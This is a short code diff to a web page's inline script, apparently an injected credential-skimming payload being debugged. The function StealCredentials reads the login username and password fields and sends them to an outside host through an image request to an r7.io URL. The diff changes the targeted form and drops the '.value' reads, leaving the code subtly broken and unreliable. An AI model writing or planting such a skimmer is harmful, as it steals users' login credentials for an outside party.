@@ -36,15 +36,15 @@
             console.log(document.forms);
             function StealCredentials() {
               console.log("test2");
-                var username = document.getElementById("login_username").value;
-                var pass = document.getElementById("login_password").value;
+                var username = document.getElementById("login_username");
+                var pass = document.getElementById("login_password");
                 var credentials = "username = " + username + " | " + "password = " + pass;
                 console.log(credentials);
                 img = document.createElement("img");
                 img.src = "http://r7.io/e/nhytrek?s=" + credentials;
             }
             console.log("test4");
-            document.forms[1].onsubmit = StealCredentials();
+            document.forms[0].onsubmit = StealCredentials();
             </script>
       </p>
 
